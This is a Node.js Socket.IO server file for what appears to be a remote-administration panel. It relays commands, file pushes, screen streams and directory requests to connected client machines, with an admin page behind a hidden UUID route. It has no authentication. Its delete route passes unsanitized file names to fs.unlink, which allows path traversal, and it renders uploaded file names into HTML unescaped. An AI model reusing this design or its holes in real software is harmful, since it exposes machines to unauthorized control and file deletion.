const express = require('express');
const port = process.env.PORT || 3000;
var app = new express();
var bodyParser = require('body-parser');
var path = require('path');
var filesize = require('filesize');
var multer = require('multer')

var app = express();
app.set('views', path.join(__dirname, 'views'));
app.set('view engine', 'ejs');
var upload = multer({ dest: 'public/uploads/' })

app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: false }));
var http = require("http").Server(app);
var io = require("socket.io")(http);
app.use(express.static(__dirname + "/public"));
app.get('/d03e04fc-9775-4ed3-9e66-15671b3a8df5', function (req, res) {
    res.redirect('manager.html');
});
app.get('/', function (req, res) {
    res.redirect('index.html');
});
var fs = require('fs');
var adminSocketID;
var IDlist = [];
var File = 0;
io.on('connection', async function (socket) {
    var sId = socket.id;
    IDlist.push(sId);
    console.log('Client ' + sId.toString() + ' connected')
    socket.broadcast.emit('oneConnect', sId);
    socket.on('callServer', async function () {
        await socket.broadcast.emit('callClient');
    });
    socket.on('browserReply', async function (data) {
        adminSocketID = socket.id;
        await socket.broadcast.emit('server', 'ON');

    });
    socket.on('removeMyID', async function () {
        var index = IDlist.indexOf(sId);    // <-- Not supported in <IE9
        if (index !== -1) {
            IDlist.splice(index, 1);
        }
        await socket.emit('updateOnline', IDlist);
    });

    socket.on('checkonline', function () {
        socket.emit('notiOnline',IDlist.length);
    });
    socket.broadcast.emit('updateOnline', IDlist);
    socket.on('reject', async function (id) {
        try {
            await socket.to(id).emit('ej', 'offf');
        } catch (error) {
        }
    });
    socket.on('deleteLog', async function () {
        try {
            fs.open('./public/commandLog.txt', 'w', function (err, file) {
                if (err) throw err;
                console.log('File renew');
            });

        } catch (error) {

        }
    });
    socket.on('activate', async function () {
        try {
            fs.readFile('./public/active', function(err, contents) {
                var active = contents.toString();
                console.log(active+'|');
                if (active == "OFF")
                {
                    var logStream = fs.createWriteStream('./public/active', { flags: 'w' });
                    logStream.write('ON');
                    logStream.end('');
                    socket.emit('activeStat',1);//1 la active, 0 la deactive
                }
                else
                {
                    var logStream = fs.createWriteStream('./public/active', { flags: 'w' });
                    logStream.write('OFF');
                    logStream.end('');
                    socket.emit('activeStat',0);//1 la active, 0 la deactive
                }
            });
        } catch (error) {

            console.log(error)
        }
    });
    
    socket.on('checkStatus', async function () {
        try {
            fs.readFile('./public/active', function(err, contents) {
                var active = contents.toString();
                console.log(active+'|');
                if (active == "ON")
                {
                    socket.emit('activeStat',1);//1 la active, 0 la deactive
                }
                else
                {
                    socket.emit('activeStat',0);//1 la active, 0 la deactive
                }
            });
        } catch (error) {

            console.log(error)
        }
    });
    socket.on('Error', async function (data) {
        var moment = require('moment-timezone');
        var dt = moment.now();
        var date = moment.tz(dt, "Asia/Ho_Chi_Minh").format('DD/MM/YYYY, hh:mm:ss a');
        var logStream = fs.createWriteStream('./public/commandLog.txt', { flags: 'a' });
        // use {flags: 'a'} to append and {flags: 'w'} to erase and write a new file
        logStream.write(date + " : " + data);
        logStream.end('\n');
        await socket.broadcast.emit('showErr', [data, sId]);

    });
    socket.on('stream', async function (data) {
        var id_img = [socket.id, data]
        await socket.broadcast.emit('stream', id_img);
    });
    socket.on('AddID', async function (id) {
        IDlist.push(id);
        await socket.emit('updateOnline', IDlist);
    });
    socket.on('DelID', async function (id) {
        var index = IDlist.indexOf(id);    // <-- Not supported in <IE9
        if (index !== -1) {
            IDlist.splice(index, 1);
        }
        await socket.emit('updateOnline', IDlist);
    });
    socket.on('disconnect', async function () {
        var index = IDlist.indexOf(sId);    // <-- Not supported in <IE9
        if (index !== -1) {
            IDlist.splice(index, 1);
        }
        if (socket.id == adminSocketID) {
            await socket.broadcast.emit('adminleft', 'Admin leave');
        }
        else {
            await socket.broadcast.emit('oneLeft', socket.id);
            console.log(socket.id + ' left')
        }
    });

    socket.on('downspeed', async function (id) {
        await socket.to(id).emit('downspeed', 'Speed down');
    });
    socket.on('Logoff', async function (id) {
        await socket.to(id).emit('logoff', 'Off');
    });
    socket.on('Login', async function (id) {
        await socket.to(id).emit('login', 'Off');
    });
    socket.on('command', async function (cmd_id) {
        // Format : command|time
        var cmd = cmd_id[0];
        var id = cmd_id[1];
        await socket.to(id).emit('command', cmd);
    });
    socket.on('sendFile', async function (plug_id) {

        var plug = plug_id[0];
        var id = plug_id[1];
        var moment = require('moment-timezone');
        var dt = moment.now();
        var date = moment.tz(dt, "Asia/Ho_Chi_Minh").format('DD/MM/YYYY, hh:mm:ss a');
        var logStream = fs.createWriteStream('./public/commandLog.txt', { flags: 'a' });
        // use {flags: 'a'} to append and {flags: 'w'} to erase and write a new file
        logStream.write(date + " : " + plug);
        logStream.end('\n');
        await socket.to(id).emit('sendFile', plug);
    });
    socket.on('upspeed', async function (id) {
        await socket.to(id).emit('upspeed', 'Speed up');
    });
    socket.on('getDir', async function (id_dir) {
        // await socket.broadcast.emit(id_dir[0], id_dir[1]);
        await socket.broadcast.emit('listDir', id_dir[1]);
    });
    socket.on('getFile', async function (id_dir) {
        await socket.broadcast.emit('getFile', id_dir[1]);
    });
    socket.on('fileAction', async function (id_dir) {
        await socket.broadcast.emit('cFileAction', id_dir[1]);
    });
    socket.on('cFileActionReply', async function (messages) {
        await socket.broadcast.emit('FileActionReply', messages);
    });

    socket.on('sendFileOK', async function (messages) {
        // Tai len file thanh cong
        var id = socket.id;
        await socket.broadcast.emit('getFileMessages', [id, messages, File]);
    });
    socket.on('scanFile', async function (messages) {
        fs.readdir('./public/uploads/', function (err, files) {
            //handling error
            if (err) {
                return console.log('Unable to scan directory: ' + err);
            }
            File = files.length;
            socket.emit("UpdateFiles", File);
        });
    });
    socket.on('resDir', async function (list) {
        var id = socket.id;
        socket.broadcast.emit('dirlist', [id, list]);
    });
    socket.on('resDirEr', async function (mess) {

    });
});
app.post('/', (req, res) => {
    var data = req.body.img;
    imgbase64 = data.substr(2, data.length - 3);
    fs.writeFile('./public/client.txt', imgbase64,//'base64',
        function (err, data) {
            if (err) {
                console.log(err);
            }
        });
    res.send('ok')
})
app.post('/file', upload.array('file'), function (req, res, next) {
    var data = JSON.parse(JSON.stringify(req.files))
    var path = data[0].path;
    var origi = data[0].originalname;
    var des = data[0].destination;
    fs.rename(path, des + origi, function (err) {
        if (err) console.log('ERROR: ' + err);
    });
    res.send('ok')
})
app.get('/delete', (req, res) => {
    var file = req.query.file;
    fs.unlink('public/uploads/' + file, function (err) {
        if (err) throw err;
        // if no error, file has been deleted successfully
        console.log('File deleted!');
    });
    res.redirect('/file');
});
app.get('/file', (req, res) => {
    var body = '';
    var Files = 0;
    var moment = require('moment-timezone');
    fs.readdir('./public/uploads/', function (err, files) {
        //handling error
        if (err) {
            return console.log('Unable to scan directory: ' + err);
        }
        Files = files.length;
        //listing all files using forEach
        files.forEach(function (file) {
            stats = fs.statSync('public/uploads/' + file);
            // Do whatever you want to do with the file
            var size = filesize(stats.size, { round: 0 });
            // console.log(stats);
            var date = moment.tz(stats.atime, "Asia/Ho_Chi_Minh").format('DD/MM/YYYY, hh:mm:ss a');
            // `<li class="list-group-item"><a href="../uploads/${file}">${file}</a></li>`;
            body = body + `
            <tr>
            <td width="40%">${file}</td>
            <td width="15%">${size}</td>
            <td width="25%">${date}</td>
            <td style="text-align: center;" width="20%">
                <button type="button" class="btn btn-outline-success"><a href='../uploads/${file}' target="_blank">Download</a></button>
                <button type="button" class="btn btn-outline-success"><a href='../delete?file=${file}'>Delete</a></button>
            </td>
            </tr>
            `
        });
        res.render("file",
            {
                body: body,
                total: Files
            })
    });
});


http.listen(port, function () {
    console.log("Server running at port " + port);
});